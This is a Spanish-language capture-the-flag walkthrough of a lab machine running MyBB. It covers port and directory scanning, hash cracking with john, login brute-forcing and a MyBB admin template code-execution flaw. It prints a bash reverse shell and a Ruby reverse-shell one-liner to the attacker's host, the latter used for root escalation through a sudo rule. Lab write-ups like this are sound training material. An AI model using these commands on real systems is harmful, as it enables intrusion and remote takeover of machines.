# MÁQUINA MYBB

Lo primero que deberemos hacer será un escaneo de puertos, para ello usaremos el siguiente comando:

```shell
nmap -p- --open -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

Vemos que unicamente tiene abierto el puerto 80, así que introducimos la IP en nuestro navegador y vemos lo siguiente:

![NAV](https://github.com/Isma-yo/photos/blob/main/MyBB/foto.png)

Cuando vamos al apartado de foro, vemos que no nos carga pero sin embargo nos da un nombre de dominio (tener cuidado que se carga como HTTPS y no como HTTP):

![NAV2](https://github.com/Isma-yo/photos/blob/main/MyBB/foto2.png)

Este dominio será el que deberemos de añadir al fichero /etc/hosts:

![DOM](https://github.com/Isma-yo/photos/blob/main/MyBB/foto3.png)

Vemos que ahora si nos carga la página, la inspeccionamos pero no encontramos nada fuera de lo común, así que deberemos de empezar a listar directorios, para ello usaremos el comando gobuster:

```shell
gobuster dir -u http://panel.mybb.dl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Descubrimos que hay una carpeta con nombre “backups” por lo que procedemos a ver que hay dentro:

![INDEX](https://github.com/Isma-yo/photos/blob/main/MyBB/foto4.png)

Vemos que hay un archivo con nombre data que parece interesante, veamos que hay dentro:

![DIREC](https://github.com/Isma-yo/photos/blob/main/MyBB/foto5.png)

Encontramos un usuario alice y una contraseña la cuál parece estar hasheada. Para conocer la contraseña usaremos un ataque de fuerza bruta con la herramienta john y el diccionario rockyou.txt:

```shell
john -w=/usr/share/wordlists/rockyou.txt hash
```

![JOHN](https://github.com/Isma-yo/photos/blob/main/MyBB/foto6.png)

Sin embargo estas credenciales no nos permiten acceder al login, por lo que el siguiente paso será realizar una ataque de fuerza bruta contra la página de login usando el usuario admin que podemos ver que existe tanto en la propia web como en el fichero data que hemos encontrado.

Para el ataque primero interceptaremos la petición con BurpSuite y una vez ya tengamos los datos que necesitamos (usuario, contraseña y error) podemos ejecutar el ataque de fuerza bruta:

![BF](https://github.com/Isma-yo/photos/blob/main/MyBB/foto7.png)

Copiamos todo todo el contenido de la linea 16.

![HY](https://github.com/Isma-yo/photos/blob/main/MyBB/foto8.png)

Vemos que nos da muchas contraseñas como correctas, estas son falsos positivos. Para encontrar la contraseña correcta deberemos de ir probando una por una hasta encontrar la correcta, en esta caso la correcta es babygirl.

![MYBB](https://github.com/Isma-yo/photos/blob/main/MyBB/foto9.png)

Vemos que ya podemos acceder y que existe un apartado con nombre “Admin CP”:

![MYBB2](https://github.com/Isma-yo/photos/blob/main/MyBB/foto10.png)

Aquí podemos observar la versión de MyBB que estamos utilizando, ahora deberemos de investigar acerca de esta versión para ver que podemos encontrar.

Vemos que existe una vulnerabilidad que permite la inyección de código malicioso PHP a través de Templates, por lo que procederemos a explotarla a ver que conseguimos sacar:

https://blog.sorcery.ie/posts/mybb_acp_rce/

Tras seguir los pasos que se encuentran en la máquina vemos que si podemos ejecutar código malicioso:

![WWW](https://github.com/Isma-yo/photos/blob/main/MyBB/foto11.png)

Por lo que nos enviaremos una reverse shell:

```shell
'bash -c “bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261”'
```
![SH](https://github.com/Isma-yo/photos/blob/main/MyBB/foto12.png)

Una vez conectados tratamos la tty con los siguientes comandos:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash 
```

No podemos ejecutar el comando sudo -l y con el comando find / -perm -4000 2>/dev/null no encontramos nada que podamos usar para la escalada de privilegios, así que intentamos convertimos en el usuario alice con la contraseña que obtuvimos de la página data y vemos que efectivamente podemos convertirnos en alice:

![AL](https://github.com/Isma-yo/photos/blob/main/MyBB/foto13.png)

Si ahora hacemos un sudo -l vemos que podemos ejecutar cualquier archivo que acabe en .rb dentro del directorio scripts, por lo que vamos a crear un script en nuestra máquina atacante que nos genere una reverse shell para poder conseguir esa escalada de privilegios que buscamos.

https://gtfobins.github.io/gtfobins/ruby/#reverse-shell

```shell
export RHOST=172.17.0.1
export RPORT=443
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Y ya somos root!
Una vez creado lo compartimos a la máquina víctima y le damos permiso de ejecución, lo ejecutamos con el usuario root mientras estamos en escucha desde nuestra máquina atacante y bingo, somos root.

![ROOT](https://github.com/Isma-yo/photos/blob/main/MyBB/foto14.png)


